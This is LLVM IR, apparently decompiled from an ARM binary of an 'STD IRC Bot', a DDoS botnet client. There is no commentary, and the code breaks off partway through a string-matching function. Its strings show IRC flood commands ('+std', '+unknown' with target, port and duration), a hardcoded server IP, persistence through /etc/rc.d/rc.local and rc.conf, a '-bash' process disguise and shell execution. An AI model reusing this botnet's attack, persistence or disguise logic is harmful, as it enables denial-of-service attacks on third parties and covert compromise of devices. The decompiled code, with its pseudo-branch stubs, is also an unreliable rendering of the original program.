source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%pollfd = type { i32, i16, i16 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rlimit = type { i32, i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.15 = constant i32 -352321502
@global_var_26328.19 = global i32 0
@global_var_26348.20 = global i32* @global_var_26328.19
@global_var_2ac00.27 = global i32 0
@global_var_2632c.30 = global i32 0
@global_var_a1c4.34 = constant i32 -509558771
@global_var_2b02c.39 = global i32 0
@global_var_2f53c.41 = global i32 0
@global_var_1c3bc.43 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_1c3e0.48 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_2ac28.50 = local_unnamed_addr global i32 0
@global_var_2f554.52 = global i32 0
@global_var_1c400.54 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1c410.56 = constant i32 114
@global_var_2f530.58 = local_unnamed_addr global i32 0
@global_var_1c414.60 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_2f550.62 = local_unnamed_addr global i32 0
@global_var_1c430.64 = constant [46 x i8] c"PRIVMSG %s :>bot +std <target> <port> <secs>\0A\00"
@global_var_1c460.66 = constant [30 x i8] c"PRIVMSG %s :[STD]Hitting %s!\0A\00"
@global_var_1c480.68 = constant [4 x i8] c"std\00"
@global_var_1c484.70 = constant [35 x i8] c"PRIVMSG %s :[STD]Done hitting %s!\0A\00"
@global_var_1c4a8.74 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_1c4c8.78 = constant [43 x i8] c"PRIVMSG %s :>bot +unknown <target> <secs>\0A\00"
@global_var_1c4f4.80 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1c514.82 = constant [35 x i8] c"PRIVMSG %s :[UNK]Done hitting %s!\0A\00"
@global_var_1c3b4.84 = constant [5 x i8] c"Fine\00"
@global_var_1c554.85 = constant [5 x i8] c"+std\00"
@global_var_2635c.86 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c3b4.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c554.85, i32 0, i32 0)]
@global_var_1c538.89 = constant [25 x i8] c"PRIVMSG %s :Nice try...\0A\00"
@global_var_2f538.92 = global i32 0
@global_var_1c584.94 = constant i32 0
@global_var_26360.96 = global [5 x i8]* @global_var_1c554.85
@global_var_1c588.99 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_2f54c.102 = local_unnamed_addr global i32 0
@global_var_1c598.104 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1c5a8.106 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1c5b0.108 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_2ac24.111 = global i32 0
@global_var_1c5bc.114 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_1c61c.122 = constant i32 0
@global_var_2ac18.125 = global i32 0
@global_var_26350.127 = local_unnamed_addr global i32 1
@global_var_1c3a4.129 = constant [14 x i8] c"178.156.202.2\00"
@global_var_26354.130 = global [14 x i8]* @global_var_1c3a4.129
@global_var_2f544.132 = global i32 0
@global_var_1c640.134 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1c654.137 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1c664.139 = constant i32 47
@global_var_1c668.141 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1c670.143 = constant i32 97
@global_var_1c674.145 = constant [6 x i8] c"-bash\00"
@global_var_1c67c.150 = constant [4 x i8] c"STD\00"
@global_var_2f540.152 = local_unnamed_addr global i32 0
@global_var_1c680.154 = constant [12 x i8] c"STD IRC Bot\00"
@global_var_1c68c.157 = constant i32 35
@global_var_2f534.160 = local_unnamed_addr global i32 0
@global_var_1c690.164 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_1c69c.166 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_1c6c8.170 = constant i32 10
@global_var_1c620.172 = constant [4 x i8] c"352\00"
@global_var_26388.173 = global [4 x i8]* @global_var_1c620.172
@global_var_1c6cc.175 = constant [6 x i8] c"ERROR\00"
@global_var_2b16c.177 = global i32 0
@global_var_2a3e0 = external global i32
@global_var_2b170.180 = global i32 0
@global_var_2b174.182 = global i32 0
@global_var_2a5c0.184 = global i32 0
@global_var_2f558.186 = global i32 0
@global_var_2a5d8.188 = local_unnamed_addr global i32 0
@global_var_2a5d4.189 = local_unnamed_addr global i32 0
@global_var_2b030.191 = global i32 0
@global_var_2b034.193 = global i32 0
@global_var_2a7a4.195 = global i32 -1
@global_var_2a7a0.197 = global i32* @global_var_2a3e0
@global_var_2f568.200 = local_unnamed_addr global i32 0
@global_var_2a7b0.202 = global i32 34
@global_var_263c0.205 = global i32 0
@global_var_2a3c0.207 = global i32 2
@global_var_103d4.209 = constant i32 -382910448
@global_var_2f55c.213 = global i32 0
@global_var_2f564.215 = global i32 0
@global_var_b090.217 = constant [3 x i8] c"w\09\00"
@global_var_2a610.219 = global i32 0
@global_var_2a608.220 = global i32 0
@global_var_2a60c.221 = local_unnamed_addr global i32 0
@global_var_2a604.222 = local_unnamed_addr global i32* @global_var_2a608.220
@global_var_2a7ac.224 = global i32 33
@global_var_131cc.227 = constant i32 -497995776
@global_var_d688.230 = constant i32 -382910416
@global_var_b094.232 = constant i32 -382910416
@global_var_2f3e8.239 = global i32 0
@global_var_2b038.243 = global i32 0
@global_var_af9c.247 = constant i32 -509591552
@global_var_aec0.250 = constant i32 -498216808
@global_var_2b178.252 = global i32 0
@global_var_2b17c.254 = global i32 0
@global_var_263d0.257 = global i32 0
@global_var_2a5dc.258 = local_unnamed_addr global i32* @global_var_263d0.257
@global_var_2b03c.260 = global i32 0
@global_var_2b054.263 = global i32 0
@global_var_2b058.265 = global i32 0
@global_var_2b05c.267 = global i32 0
@global_var_2f574.269 = global i32 0
@global_var_2f3bc.271 = global i32 0
@global_var_baa0.278 = constant i32 -442564508
@global_var_badc.279 = constant i32 -442564548
@global_var_c034.293 = constant i32 48700
@global_var_be3c.294 = constant i32 -382910416
@global_var_2b060.304 = global i32 0
@global_var_2a7a8.307 = global i32 32
@global_var_c310.311 = constant i32 -382910224
@global_var_c374.313 = constant i32 -382908944
@global_var_c290.320 = constant i32 -509546482
@global_var_2b168.327 = global i32 0
@global_var_2b164.329 = global i32 0
@global_var_c938.336 = constant i32 -369097902
@global_var_2a878.340 = global i32 35
@global_var_2a87c.342 = global i32 64
@global_var_263e0.346 = global i32 0
@global_var_2b184.354 = global i32 0
@global_var_2f570.368 = global i32 0
@global_var_2d1cc.371 = global i32 0
@global_var_2d1c8.374 = global i32 0
@global_var_fdc0.378 = constant i32 -382910352
@global_var_2a89c.382 = global i32* bitcast (i8** @global_var_2a8d4.381 to i32*)
@global_var_2a42c.385 = local_unnamed_addr global i32* @global_var_2d1cc.371
@global_var_2a8d0.387 = global i32 2
@global_var_2a3f4.389 = local_unnamed_addr global i32 0
@global_var_2a424.390 = local_unnamed_addr global i32* @global_var_2d1c8.374
@global_var_10908.391 = constant i32 -382910448
@global_var_de48.393 = constant i32 -382910448
@global_var_2b180.402 = global i32 0
@global_var_d8c8.403 = constant i32 -382908944
@global_var_2f56c.408 = global i32 0
@global_var_2a57c.410 = local_unnamed_addr global i32 0
@global_var_2a580.412 = local_unnamed_addr global i32 0
@global_var_b924.415 = constant i32 -382910416
@global_var_2a768.416 = local_unnamed_addr global i32 0
@global_var_2a76c.419 = local_unnamed_addr global i32 0
@global_var_2a5d0.420 = local_unnamed_addr global i32 0
@global_var_b1cc.422 = constant i32 -442550536
@global_var_cec0.431 = constant i32 -382910352
@global_var_ecfc.433 = constant i32 -498216812
@global_var_e9b8.456 = constant i32 -476053394
@global_var_eac8.459 = constant i32 -442695672
@global_var_d674.469 = constant i32 -442552312
@global_var_ecac.474 = constant i32 -382910416
@global_var_2b188.483 = global i32 0
@global_var_2b1a0.485 = global i32 0
@global_var_2b1ac.487 = global i32 0
@global_var_f740.506 = constant i32 -382910416
@global_var_e6d4.509 = constant i32 -382910416
@global_var_2b1b0.528 = global i32 0
@global_var_2d1b0.533 = global i32 0
@global_var_fd48.541 = constant i32 -476053493
@global_var_fef8.544 = constant i32 -275775369
@global_var_fee0.545 = constant i32 -369098686
@global_var_10934.547 = constant i32 -481230848
@global_var_2a884 = external local_unnamed_addr global i32
@global_var_2a8b8.557 = global i32 0
@global_var_2d1d0.559 = global i32 0
@global_var_134b0.561 = constant i32 -481296384
@global_var_10bb4.562 = constant i32 -442564544
@global_var_2d1d4.564 = global i32 0
@global_var_2a8a0.575 = global i32 0
@global_var_10f7c.576 = constant i32 -442564492
@global_var_1ca00.583 = constant i32 0
@global_var_f790.588 = constant i32 -443535348
@global_var_1113c.589 = constant i32 -382910448
@global_var_14dc0.590 = constant i32 -382909968
@global_var_14e7c.591 = constant i32 -382910224
@global_var_1ca34.593 = constant i32 135270416
@global_var_1ca18.595 = constant [6 x i8] c"(nil)\00"
@global_var_1ca20.598 = constant [7 x i8] c"(null)\00"
@global_var_1ca28.600 = constant i32 2949163
@global_var_1cab4.603 = constant i32 16843008
@global_var_1ca9c.605 = constant i32 327688
@global_var_2abb8 = external global i32
@global_var_1da6e.610 = constant i32 65536
@global_var_1ca94.612 = constant [8 x i8] c" +0-#'I\00"
@global_var_1ca3c.614 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1ca7c.616 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1ca6f.618 = constant i32 117506048
@global_var_1ca70.620 = constant i32 252117248
@global_var_1ca60.622 = constant i32 331776
@global_var_1ca50.624 = constant i32 335616
@global_var_1268c.656 = constant i32 -456978431
@global_var_1cad0.660 = constant [8 x i8] c"Success\00"
@global_var_1cac0.662 = constant [15 x i8] c"Unknown error \00"
@global_var_2abc0.664 = global i32* @global_var_1da6e.610
@global_var_2f1d8.666 = global i32 0
@global_var_2f3a8.670 = global i32 0
@global_var_2f1dc.672 = global i32 0
@global_var_2abe0.674 = global i32 0
@global_var_2f650.679 = global i32 0
@global_var_2f644.682 = global i32 0
@global_var_2aac0.686 = global i32 256
@global_var_2a9c4.687 = global i32* @global_var_2aac0.686
@global_var_14c30.691 = constant i32 -382910416
@global_var_12610.692 = constant i32 -509595648
@global_var_13530.699 = constant i32 -442564520
@global_var_2aacc.705 = global i32 0
@global_var_2f3d4.708 = global i32 0
@global_var_fff0.710 = constant i32 -509587456
@global_var_2aae4.712 = global i32 0
@global_var_2aafc = external global i32
@global_var_2ab1c.718 = global i32 -1726662223
@global_var_2ab04.725 = local_unnamed_addr global i32* @global_var_2ab1c.718
@global_var_2ab00.727 = global i32* @global_var_2ab1c.718
@global_var_1d62c.741 = constant i32 0
@global_var_1d654.748 = constant [8 x i8] c"/bin/sh\00"
@global_var_1d65c.750 = constant [3 x i8] c"sh\00"
@global_var_1d660.752 = constant [3 x i8] c"-c\00"
@global_var_2ab98.756 = global i32 0
@global_var_2f3d8.760 = global i32 0
@global_var_11084.763 = constant i32 -382910416
@global_var_2f3e4.765 = global i32 0
@global_var_2f3dc.768 = global i32 0
@global_var_26318.770 = global i32 -1
@global_var_2f3ec.773 = global i32 0
@global_var_2f3f0.775 = local_unnamed_addr global i32 0
@global_var_14594.776 = constant i32 -390234096
@global_var_1d664.778 = constant [10 x i8] c"/dev/null\00"
@global_var_2f3f4.780 = global i32 0
@global_var_11004.784 = constant i32 -382909968
@global_var_2f3e0.786 = local_unnamed_addr global i32 0
@global_var_12600.789 = constant i32 -369095406
@global_var_2abb0 = external local_unnamed_addr global i32
@global_var_ad60.801 = constant i32 -449978364
@global_var_1485c.802 = constant i32 -335544717
@global_var_2f3fc.805 = global i32 0
@global_var_2f58c.807 = global i32 0
@global_var_f604.811 = constant i32 -382910224
@global_var_2f3f8.813 = global i32 0
@global_var_14894.815 = constant i32 -442552292
@global_var_2f61c.819 = global i32 0
@global_var_2f630.822 = global i32 0
@global_var_2f620.825 = global i32 0
@global_var_2f590.828 = global i32 0
@global_var_2f524.834 = global i32 0
@global_var_1dc70.837 = constant [4 x i8] c"inf\00"
@global_var_1dc73.841 = constant i32 1179535616
@global_var_1dc80.843 = constant i32 2883630
@global_var_12290.845 = constant i32 -382908944
@global_var_164a8.850 = constant i32 91400
@global_var_2a890 = external global i32
@global_var_1dccc.853 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_2abc4.855 = global i32 92496
@global_var_167d0.856 = constant i32 -444268464
@global_var_10018.859 = constant i32 -382910448
@global_var_2f610.862 = global i32 0
@global_var_2f614.863 = local_unnamed_addr global i32 0
@global_var_2f618.864 = local_unnamed_addr global i32 0
@global_var_2f4c4.872 = global i32 0
@global_var_2f4dc.875 = global i32 0
@global_var_2f4e0.878 = global i32 0
@global_var_17218.889 = constant i32 -382910416
@global_var_1dcfc.892 = constant i32 0
@global_var_1dd14.896 = constant i32 97860
@global_var_17ea4.897 = constant i32 -481296384
@global_var_1dd20.899 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_18170.900 = constant i32 -369098742
@global_var_1844c.901 = constant i32 -369098742
@global_var_18548.902 = constant i32 -369098741
@global_var_2f4f8.904 = global i32 0
@global_var_1dd7a.906 = constant i32 0
@global_var_1dd44.909 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_1dd60.912 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_1dd80.914 = constant i32 100644
@global_var_2f4fc.918 = global i32 0
@global_var_2f514.923 = local_unnamed_addr global i32 0
@global_var_2f654.930 = global i32 0
@global_var_1dda8.932 = constant i32 46
@global_var_2f634.934 = global i32 0
@global_var_192b8.936 = constant i32 -369098656
@global_var_1ddac.943 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1ddc0.945 = constant i32 114
@global_var_1ddc4.947 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1dddc.950 = constant [11 x i8] c"nameserver\00"
@global_var_1dde8.953 = constant [7 x i8] c"domain\00"
@global_var_1ddf0.955 = constant [7 x i8] c"search\00"
@global_var_2f658.960 = global i32 0
@global_var_2f518.963 = global i32 0
@global_var_2f51c.965 = global i32 0
@global_var_2f520.972 = global i32 0
@global_var_2f6d8.978 = global i32 0
@global_var_2f6dc.980 = global i32 0
@global_var_1ddf8.994 = constant i32 107116
@global_var_1a360.995 = constant i32 -444268484
@global_var_1de0c.1002 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_1de24.1005 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_1de5c.1008 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_1de8c.1010 = constant i32 5
@global_var_1de94.1016 = constant i32 60
@global_var_1a7b4.1018 = constant i32 -442695632
@global_var_1de74.1025 = constant [24 x i8] c"Cannot register service\00"
@global_var_1a8c4.1026 = constant i32 -442695632
@global_var_2f52c.1028 = global i32 0
@global_var_1de9c.1031 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_1decc.1033 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1deb8.1035 = constant i32 0
@global_var_1dee0.1038 = constant [3 x i8] c"%x\00"
@global_var_1dee4.1041 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1def0.1043 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1df06.1048 = constant i32 1931804672
@global_var_1df04.1050 = constant [3 x i8] c": \00"
@global_var_1df08.1053 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_1e150.1057 = constant [13 x i8] c"RPC: Success\00"
@global_var_1e0c0.1059 = constant i32 0
@global_var_1df10.1061 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_1df2c.1064 = constant [5 x i8] c"%s: \00"
@global_var_1df34.1066 = constant [4 x i8] c" - \00"
@global_var_1df38.1071 = constant [13 x i8] c"; errno = %s\00"
@global_var_1dff8.1073 = constant [18 x i8] c"Authentication OK\00"
@global_var_1dfb8.1075 = constant i32 0
@global_var_1df70.1077 = constant [9 x i8] c"; why = \00"
@global_var_1df7c.1079 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_1df48.1081 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_1dfa0.1083 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_26320.1086 = global i32 0
@global_var_2631c.1087 = global i32 55496
@global_var_2abfc.17 = external global i8*
@global_var_2ac2c.37 = external global i8*
@global_var_2ac1c.45 = external local_unnamed_addr global i8*
@global_var_2ac20.116 = external local_unnamed_addr global i8*
@global_var_2ac23.117 = external local_unnamed_addr global i8*
@global_var_2ac22.118 = external local_unnamed_addr global i8*
@global_var_2ac21.119 = external local_unnamed_addr global i8*
@global_var_f360.273 = constant i8 12
@1 = internal constant [3 x i8] c" \01\00"
@global_var_2a8d4.381 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_2a924.551 = local_unnamed_addr global i8 16
@global_var_2a8d5.580 = local_unnamed_addr global i8 1
@global_var_2a925.581 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_2abdc.925 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_2abdd.926 = local_unnamed_addr global i8 0
@global_var_2f528.998 = external global i8*
@global_var_2f529.999 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2abfc.17 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2abfc.17 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_26348.20 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_26348.20 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_26348.20 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_26348.20 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2abfc.17 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_26348.20, { 1, 0 }
  uselistorder i8** @global_var_2abfc.17, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_2632c.30, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2632c.30 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2632c.30 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2632c.30, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_a1c4.34 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 115600, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp19 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 84
  br i1 %v7_81f4, label %dec_label_pc_84b4, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %entry
  %v8_8204 = icmp ugt i8 %v2_81e8, 84
  br i1 %v8_8204, label %dec_label_pc_824c, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v7_820c = icmp eq i8 %v2_81e8, 66
  br i1 %v7_820c, label %dec_label_pc_83d4, label %dec_label_pc_8214

dec_label_pc_8214:                                ; preds = %dec_label_pc_8208
  %v8_821c = icmp ugt i8 %v2_81e8, 66
  br i1 %v8_821c, label %dec_label_pc_823c, label %dec_label_pc_8220

dec_label_pc_8220:                                ; preds = %dec_label_pc_8214
  %v2_8224 = icmp eq i8 %v2_81e8, 0
  br i1 %v2_8224, label %dec_label_pc_8274, label %dec_label_pc_822c

dec_label_pc_822c:                                ; preds = %dec_label_pc_8220
  %v7_8230 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8230, label %dec_label_pc_8524, label %dec_label_pc_857c

dec_label_pc_823c:                                ; preds = %dec_label_pc_8214
  %v7_8240 = icmp eq i8 %v2_81e8, 79
  br i1 %v7_8240, label %dec_label_pc_8444, label %dec_label_pc_857c

dec_label_pc_824c:                                ; preds = %dec_label_pc_81fc
  %v7_8250 = icmp eq i8 %v2_81e8, 111
  br i1 %v7_8250, label %dec_label_pc_82f4, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_824c
  %v7_825c = icmp eq i8 %v2_81e8, 116
  br i1 %v7_825c, label %dec_label_pc_8364, label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8258
  %v7_8268 = icmp eq i8 %v2_81e8, 98
  br i1 %v7_8268, label %dec_label_pc_8284, label %dec_label_pc_857c

dec_label_pc_8274:                                ; preds = %dec_label_pc_8220
  %v2_8278 = load i8, i8* %tmp, align 1
  %v3_8278 = zext i8 %v2_8278 to i32
  br label %dec_label_pc_85f0

dec_label_pc_8284:                                ; preds = %dec_label_pc_8264
  %v1_8288 = add i32 %tmp19, 1
  %v3_8294 = inttoptr i32 %v1_8288 to i8*
  %v4_8294 = call i32 @strwildmatch(i8* %v3_8294, i32 %arg2)
  %v2_829c = icmp eq i32 %v4_8294, 0
  br i1 %v2_829c, label %dec_label_pc_82e0, label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8284
  %v2_82a8 = load i8, i8* %tmp, align 1
  %v2_82ac = icmp eq i8 %v2_82a8, 0
  br i1 %v2_82ac, label %dec_label_pc_82e8, label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %dec_label_pc_82a4
  %v1_82b8 = add i32 %arg2, 1
  %v4_82c4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_82b8)
  %v2_82cc = icmp eq i32 %v4_82c4, 0
  br i1 %v2_82cc, label %dec_label_pc_82e0, label %dec_label_pc_82e8

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82b4, %dec_label_pc_8284
  br label %dec_label_pc_82e8

dec_label_pc_82e8:                                ; preds = %dec_label_pc_82a4, %dec_label_pc_82b4, %dec_label_pc_82e0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_82e0 ], [ 1, %dec_label_pc_82b4 ], [ 1, %dec_label_pc_82a4 ]
  br label %dec_label_pc_85f0

dec_label_pc_82f4:                                ; preds = %dec_label_pc_824c
  %v1_82f8 = add i32 %tmp19, 1
  %v3_8304 = inttoptr i32 %v1_82f8 to i8*
  %v4_8304 = call i32 @strwildmatch(i8* %v3_8304, i32 %arg2)
  %v2_830c = icmp eq i32 %v4_8304, 0
  br i1 %v2_830c, label %dec_label_pc_8350, label %dec_label_pc_8314

dec_label_pc_8314:                                ; preds = %dec_label_pc_82f4
  %v2_8318 = load i8, i8* %tmp, align 1
  %v2_831c = icmp eq i8 %v2_8318, 0
  br i1 %v2_831c, label %dec_label_pc_8358, label %dec_label_pc_8324

dec_label_pc_8324:                                ; preds = %dec_label_pc_8314
  %v1_8328 = add i32 %arg2, 1
  %v4_8334 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8328)
  %v2_833c = icmp eq i32 %v4_8334, 0
  br i1 %v2_833c, label %dec_label_pc_8350, label %dec_label_pc_8358

dec_label_pc_8350:                                ; preds = %dec_label_pc_8324, %dec_label_pc_82f4
  br label %dec_label_pc_8358

dec_label_pc_8358:                                ; preds = %dec_label_pc_8314, %dec_label_pc_8324, %dec_label_pc_8350
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8350 ], [ 1, %dec_label_pc_8324 ], [ 1, %dec_label_pc_8314 ]
  br label %dec_label_pc_85f0

dec_label_pc_8364:                                ; preds = %dec_label_pc_8258
  %v1_8368 = add i32 %tmp19, 1
  %v3_8374 = inttoptr i32 %v1_8368 to i8*
  %v4_8374 = call i32 @strwildmatch(i8* %v3_8374, i32 %arg2)
  %v2_837c = icmp eq i32 %v4_8374, 0
  br i1 %v2_837c, label %dec_label_pc_83c0, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8364
  %v2_8388 = load i8, i8* %tmp, align 1
  %v2_838c = icmp eq i8 %v2_8388, 0
  br i1 %v2_838c, label %dec_label_pc_83c8, label %dec_label_pc_8394

dec_label_pc_8394:                                ; preds = %dec_label_pc_8384
  %v1_8398 = add i32 %arg2, 1
  %v4_83a4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8398)
  %v2_83ac = icmp eq i32 %v4_83a4, 0
  br i1 %v2_83ac, label %dec_label_pc_83c0, label %dec_label_pc_83c8

dec_label_pc_83c0:                                ; preds = %dec_label_pc_8394, %dec_label_pc_8364
  br label %dec_label_pc_83c8

